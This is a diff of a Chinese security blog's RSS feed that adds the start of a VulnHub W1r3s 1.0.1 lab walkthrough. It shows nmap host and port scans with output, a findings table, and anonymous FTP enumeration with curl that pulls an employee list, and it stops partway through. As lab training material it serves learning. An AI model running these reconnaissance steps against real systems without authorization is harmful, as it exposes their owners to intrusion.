@@ -1,4 +1,1246 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Ke1thLi 的技术笔记</title><link>https://ke1thli.github.io/</link><description>Recent content on Ke1thLi 的技术笔记</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Sun, 11 Oct 2026 00:00:00 +0000</lastBuildDate><atom:link href="https://ke1thli.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>Five86-1 Vulnhub靶场复现</title><link>https://ke1thli.github.io/p/five86-1-vulnhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/</link><pubDate>Sun, 11 Oct 2026 00:00:00 +0000</pubDate><guid>https://ke1thli.github.io/p/five86-1-vulnhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/</guid><description>&lt;h1 id="five86-1-vulnhub靶场复现"&gt;Five86-1 VulnHub靶场复现
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Ke1thLi 的技术笔记</title><link>https://ke1thli.github.io/</link><description>Recent content on Ke1thLi 的技术笔记</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Fri, 16 Oct 2026 00:00:00 +0000</lastBuildDate><atom:link href="https://ke1thli.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>W1r3s-1.0.1 Vulnhub靶场复现</title><link>https://ke1thli.github.io/p/w1r3s-1.0.1-vulnhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/</link><pubDate>Fri, 16 Oct 2026 00:00:00 +0000</pubDate><guid>https://ke1thli.github.io/p/w1r3s-1.0.1-vulnhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/</guid><description>&lt;h1 id="w1r3s-101-vulnhub复现"&gt;W1r3s 1.0.1 VulnHub复现
+&lt;/h1&gt;&lt;h2 id="靶场介绍"&gt;靶场介绍
+&lt;/h2&gt;&lt;p&gt;靶场地址 &lt;a class="link" href="https://vulnhub.com/entry/w1r3s-101,220/" target="_blank" rel="noopener"
+ &gt;https://vulnhub.com/entry/w1r3s-101,220/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;介绍如下&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-markdown" data-lang="markdown"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;You have been hired to do a penetration test on the W1R3S.inc individual server and report all findings. They have asked you to gain root access and find the flag (located in /root directory).
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Difficulty to get a low privileged shell: Beginner/Intermediate
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Difficulty to get privilege escalation: Beginner/Intermediate
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;About: This is a vulnerable Ubuntu box giving you somewhat of a real world scenario and reminds me of the OSCP labs.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;If you need any hints, pointers or have questions feel free to email me: specterinthewires at gmail dot com
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Virtual Machine: VMware Workstation
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="gu"&gt;## Changelog v1.0.0 - 05/02/2018 v1.0.1 - 08/03/2018
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id="靶场部署"&gt;靶场部署
+&lt;/h3&gt;&lt;p&gt;攻击机 kali 和靶机均部署在 VMware 上，使用nat&lt;/p&gt;
+&lt;h2 id="信息收集"&gt;信息收集
+&lt;/h2&gt;&lt;h3 id="主机发现"&gt;主机发现
+&lt;/h3&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sudo nmap -sn 10.10.10.0/24
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;获取到新的靶机 ip 为 10.10.10.104&lt;/p&gt;
+&lt;h3 id="端口扫描和漏洞探测"&gt;端口扫描和漏洞探测
+&lt;/h3&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;span class="lnt"&gt;16
+&lt;/span&gt;&lt;span class="lnt"&gt;17
+&lt;/span&gt;&lt;span class="lnt"&gt;18
+&lt;/span&gt;&lt;span class="lnt"&gt;19
+&lt;/span&gt;&lt;span class="lnt"&gt;20
+&lt;/span&gt;&lt;span class="lnt"&gt;21
+&lt;/span&gt;&lt;span class="lnt"&gt;22
+&lt;/span&gt;&lt;span class="lnt"&gt;23
+&lt;/span&gt;&lt;span class="lnt"&gt;24
+&lt;/span&gt;&lt;span class="lnt"&gt;25
+&lt;/span&gt;&lt;span class="lnt"&gt;26
+&lt;/span&gt;&lt;span class="lnt"&gt;27
+&lt;/span&gt;&lt;span class="lnt"&gt;28
+&lt;/span&gt;&lt;span class="lnt"&gt;29
+&lt;/span&gt;&lt;span class="lnt"&gt;30
+&lt;/span&gt;&lt;span class="lnt"&gt;31
+&lt;/span&gt;&lt;span class="lnt"&gt;32
+&lt;/span&gt;&lt;span class="lnt"&gt;33
+&lt;/span&gt;&lt;span class="lnt"&gt;34
+&lt;/span&gt;&lt;span class="lnt"&gt;35
+&lt;/span&gt;&lt;span class="lnt"&gt;36
+&lt;/span&gt;&lt;span class="lnt"&gt;37
+&lt;/span&gt;&lt;span class="lnt"&gt;38
+&lt;/span&gt;&lt;span class="lnt"&gt;39
+&lt;/span&gt;&lt;span class="lnt"&gt;40
+&lt;/span&gt;&lt;span class="lnt"&gt;41
+&lt;/span&gt;&lt;span class="lnt"&gt;42
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;kali㉿kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~/Labs/Vulnhub/W1r3s&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ sudo nmap -sT -sV -O -sC -p- --min-rate &lt;span class="m"&gt;10000&lt;/span&gt; 10.10.10.104
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Starting Nmap 7.99 &lt;span class="o"&gt;(&lt;/span&gt; https://nmap.org &lt;span class="o"&gt;)&lt;/span&gt; at 2026-10-13 09:12 -0400
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Nmap scan report &lt;span class="k"&gt;for&lt;/span&gt; 10.10.10.104
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Host is up &lt;span class="o"&gt;(&lt;/span&gt;0.00065s latency&lt;span class="o"&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Not shown: &lt;span class="m"&gt;55528&lt;/span&gt; filtered tcp ports &lt;span class="o"&gt;(&lt;/span&gt;no-response&lt;span class="o"&gt;)&lt;/span&gt;, &lt;span class="m"&gt;10003&lt;/span&gt; closed tcp ports &lt;span class="o"&gt;(&lt;/span&gt;conn-refused&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;PORT STATE SERVICE VERSION
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;21/tcp open ftp vsftpd 2.0.8 or later
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; ftp-syst: 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; STAT: 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; FTP server status:
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; Connected to ::ffff:10.10.10.10
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; Logged in as ftp
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; TYPE: ASCII
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; No session bandwidth limit
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; Session timeout in seconds is &lt;span class="m"&gt;300&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; Control connection is plain text
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; Data connections will be plain text
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; At session startup, client count was &lt;span class="m"&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; vsFTPd 3.0.3 - secure, fast, stable
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt;_End of status
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; ftp-anon: Anonymous FTP login allowed &lt;span class="o"&gt;(&lt;/span&gt;FTP code 230&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; drwxr-xr-x &lt;span class="m"&gt;2&lt;/span&gt; ftp ftp &lt;span class="m"&gt;4096&lt;/span&gt; Jan &lt;span class="m"&gt;23&lt;/span&gt; &lt;span class="m"&gt;2018&lt;/span&gt; content
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; drwxr-xr-x &lt;span class="m"&gt;2&lt;/span&gt; ftp ftp &lt;span class="m"&gt;4096&lt;/span&gt; Jan &lt;span class="m"&gt;23&lt;/span&gt; &lt;span class="m"&gt;2018&lt;/span&gt; docs
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt;_drwxr-xr-x &lt;span class="m"&gt;2&lt;/span&gt; ftp ftp &lt;span class="m"&gt;4096&lt;/span&gt; Jan &lt;span class="m"&gt;28&lt;/span&gt; &lt;span class="m"&gt;2018&lt;/span&gt; new-employees
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 &lt;span class="o"&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class="p"&gt;;&lt;/span&gt; protocol 2.0&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; ssh-hostkey: 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="m"&gt;2048&lt;/span&gt; 07:e3:5a:5c:c8:18:65:b0:5f:6e:f7:75:c7:7e:11:e0 &lt;span class="o"&gt;(&lt;/span&gt;RSA&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="m"&gt;256&lt;/span&gt; 03:ab:9a:ed:0c:9b:32:26:44:13:ad:b0:b0:96:c3:1e &lt;span class="o"&gt;(&lt;/span&gt;ECDSA&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt;_ &lt;span class="m"&gt;256&lt;/span&gt; 3d:6d:d2:4b:46:e8:c9:a3:49:e0:93:56:22:2e:e3:54 &lt;span class="o"&gt;(&lt;/span&gt;ED25519&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;80/tcp open http Apache httpd 2.4.18 &lt;span class="o"&gt;((&lt;/span&gt;Ubuntu&lt;span class="o"&gt;))&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt;_http-title: Apache2 Ubuntu Default Page: It works
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.18 &lt;span class="o"&gt;(&lt;/span&gt;Ubuntu&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;3306/tcp open mysql MySQL &lt;span class="o"&gt;(&lt;/span&gt;unauthorized&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;MAC Address: 00:0C:29:A3:B9:0C &lt;span class="o"&gt;(&lt;/span&gt;VMware&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Aggressive OS guesses: Linux 3.10 - 4.11 &lt;span class="o"&gt;(&lt;/span&gt;98%&lt;span class="o"&gt;)&lt;/span&gt;, Linux 5.1 - 5.15 &lt;span class="o"&gt;(&lt;/span&gt;96%&lt;span class="o"&gt;)&lt;/span&gt;, Linux 3.2 - 4.14 &lt;span class="o"&gt;(&lt;/span&gt;94%&lt;span class="o"&gt;)&lt;/span&gt;, Linux 3.13 - 4.4 &lt;span class="o"&gt;(&lt;/span&gt;94%&lt;span class="o"&gt;)&lt;/span&gt;, Linux 4.10 &lt;span class="o"&gt;(&lt;/span&gt;94%&lt;span class="o"&gt;)&lt;/span&gt;, Linux 4.4 &lt;span class="o"&gt;(&lt;/span&gt;93%&lt;span class="o"&gt;)&lt;/span&gt;, Linux 3.10 &lt;span class="o"&gt;(&lt;/span&gt;92%&lt;span class="o"&gt;)&lt;/span&gt;, Linux 3.16 - 4.6 &lt;span class="o"&gt;(&lt;/span&gt;92%&lt;span class="o"&gt;)&lt;/span&gt;, OpenWrt 19.07 &lt;span class="o"&gt;(&lt;/span&gt;Linux 4.14&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;92%&lt;span class="o"&gt;)&lt;/span&gt;, Linux 2.6.32 - 3.13 &lt;span class="o"&gt;(&lt;/span&gt;91%&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;No exact OS matches &lt;span class="k"&gt;for&lt;/span&gt; host &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;test&lt;/span&gt; conditions non-ideal&lt;span class="o"&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Network Distance: &lt;span class="m"&gt;1&lt;/span&gt; hop
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Service Info: Host: W1R3S.inc&lt;span class="p"&gt;;&lt;/span&gt; OS: Linux&lt;span class="p"&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Nmap &lt;span class="k"&gt;done&lt;/span&gt;: &lt;span class="m"&gt;1&lt;/span&gt; IP address &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; host up&lt;span class="o"&gt;)&lt;/span&gt; scanned in 32.86 seconds
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;table&gt;
+ &lt;thead&gt;
+ &lt;tr&gt;
+ &lt;th&gt;端口&lt;/th&gt;
+ &lt;th&gt;服务&lt;/th&gt;
+ &lt;th&gt;标题/版本&lt;/th&gt;
+ &lt;th&gt;备注&lt;/th&gt;
+ &lt;/tr&gt;
+ &lt;/thead&gt;
+ &lt;tbody&gt;
+ &lt;tr&gt;
+ &lt;td&gt;21/tcp&lt;/td&gt;
+ &lt;td&gt;FTP&lt;/td&gt;
+ &lt;td&gt;vsftpd 2.0.8 or later；实际 banner 更像 vsFTPd 3.0.3&lt;/td&gt;
+ &lt;td&gt;允许 &lt;strong&gt;anonymous 匿名登录&lt;/strong&gt;；根目录可见 &lt;code&gt;content&lt;/code&gt;、&lt;code&gt;docs&lt;/code&gt;、&lt;code&gt;new-employees&lt;/code&gt;；控制/数据连接为明文&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;22/tcp&lt;/td&gt;
+ &lt;td&gt;SSH&lt;/td&gt;
+ &lt;td&gt;OpenSSH 7.2p2 Ubuntu 4ubuntu2.4&lt;/td&gt;
+ &lt;td&gt;Ubuntu Linux；需要凭据或密钥，暂时没有匿名入口&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;80/tcp&lt;/td&gt;
+ &lt;td&gt;HTTP&lt;/td&gt;
+ &lt;td&gt;Apache httpd 2.4.18 (Ubuntu)&lt;/td&gt;
+ &lt;td&gt;默认页：&lt;code&gt;Apache2 Ubuntu Default Page: It works&lt;/code&gt;；需要继续做 Web 枚举&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;3306/tcp&lt;/td&gt;
+ &lt;td&gt;MySQL&lt;/td&gt;
+ &lt;td&gt;MySQL (unauthorized)&lt;/td&gt;
+ &lt;td&gt;未授权/认证失败；需要凭据，且可能限制远程连接&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;nmap 漏洞脚本探测&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id="尝试21端口匿名登陆"&gt;尝试21端口匿名登陆
+&lt;/h2&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;curl -s ftp://anonymous:anonymous@10.10.10.104/
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;得到和 nmap 一样的结果，发现三个目录，接下来进行枚举&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;kali㉿kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~/Labs/Vulnhub/W1r3s&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ curl -s ftp://anonymous:anonymous@10.10.10.104/new-employees/
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; ftp ftp &lt;span class="m"&gt;155&lt;/span&gt; Jan &lt;span class="m"&gt;28&lt;/span&gt; &lt;span class="m"&gt;2018&lt;/span&gt; employee-names.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;kali㉿kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~/Labs/Vulnhub/W1r3s&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ curl -s ftp://anonymous:anonymous@10.10.10.104/new-employees/employee-names.txt -o employee-names.txt &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; cat employee-names.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;The W1R3S.inc employee list
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Naomi.W - Manager
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Hector.A - IT Dept
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Joseph.G - Web Design
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Albert.O - Web Design
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Gina.L - Inventory
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Rico.D - Human Resources
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;得到6个员工和职位&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;span class="lnt"&gt;3
+&lt;/span&gt;&lt;span class="lnt"&gt;4
+&lt;/span&gt;&lt;span class="lnt"&gt;5
+&lt;/span&gt;&lt;span class="lnt"&gt;6
+&lt;/span&gt;&lt;span class="lnt"&gt;7
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;kali㉿kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~/Labs/Vulnhub/W1r3s&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ curl -s ftp://anonymous:anonymous@10.10.10.104/docs/
